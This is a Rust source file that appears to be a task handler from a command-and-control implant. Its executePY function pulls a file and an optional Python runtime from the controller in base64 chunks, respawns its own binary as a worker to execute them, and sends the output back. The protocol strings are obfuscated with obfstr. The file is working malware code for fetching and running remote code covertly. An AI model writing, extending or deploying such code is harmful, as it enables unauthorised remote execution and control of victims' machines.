use serde::Deserialize;
use serde_json::{Value, json};
use base64::engine::general_purpose;
use base64::Engine;
use std::io::Write;
use obfstr::obfstr;
const CHUNK_SIZE: usize = 4096;

#[derive(Deserialize)]
struct UploadParams {
    file_id: String,
    parameters: String,
    python_embed_id: Option<String>,
}

fn download_file_bytes(task_id: &str, file_id: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut file_bytes = Vec::new();
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    while chunk_num <= total_chunks {
        let payload = json!({
            obfstr!("action"): obfstr!("post_response"),
            obfstr!("responses"): [{
                obfstr!("upload"): {
                    obfstr!("chunk_size"): CHUNK_SIZE,
                    obfstr!("file_id"): file_id,
                    obfstr!("chunk_num"): chunk_num
                },
                obfstr!("task_id"): task_id,
                obfstr!("completed"): true
            }]
        })
        .to_string();
        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = &resp[obfstr!("responses")][0];
        total_chunks = entry[obfstr!("total_chunks")].as_u64().ok_or("Bad `total_chunks`")? as usize;
        let chunk_data = entry[obfstr!("chunk_data")].as_str().ok_or("Missing `chunk_data`")?;
        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        file_bytes.extend_from_slice(&bytes);
        chunk_num += 1;
    }

    Ok(file_bytes)
}

pub fn executePY(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Extract fields
    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
    let params: UploadParams = serde_json::from_str(raw)?;
    let file_id = &params.file_id;

    // 2. Download chunks into buffer
    let file_bytes = download_file_bytes(id, file_id)?;
    let python_embed_bytes = if let Some(embed_id) = &params.python_embed_id {
        if embed_id.is_empty() {
            None
        } else {
            Some(download_file_bytes(id, embed_id)?)
        }
    } else {
        None
    };

    crate::helpers::churn(file_bytes.as_slice());

    let exe = std::env::current_exe()?;
    let worker_input = json!({
        "file_bytes": general_purpose::STANDARD.encode(&file_bytes),
        "parameters": params.parameters,
        "python_embed_bytes": python_embed_bytes.map(|b| general_purpose::STANDARD.encode(&b))
    })
    .to_string();

    let mut child = std::process::Command::new(&exe)
        .arg("--worker-py")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(worker_input.as_bytes())?;
    }

    let child_output = child.wait_with_output()?;

    let (results, status) = if child_output.status.success() {
        (String::from_utf8_lossy(&child_output.stdout).to_string(), "success")
    } else {
        let stderr = String::from_utf8_lossy(&child_output.stderr);
        let stdout = String::from_utf8_lossy(&child_output.stdout);
        let msg = format!(
            "PY worker exited with code {:?}{}{}",
            child_output.status.code(),
            if !stdout.is_empty() { format!("\nstdout: {}", stdout) } else { String::new() },
            if !stderr.is_empty() { format!("\nstderr: {}", stderr) } else { String::new() }
        );
        (msg, "error")
    };

    crate::helpers::churn(results.as_str());

    let done = json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("user_output"): results,
            obfstr!("agent_file_id"): file_id,
            obfstr!("status"): status,
            obfstr!("completed"): true
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;
    Ok(())
}
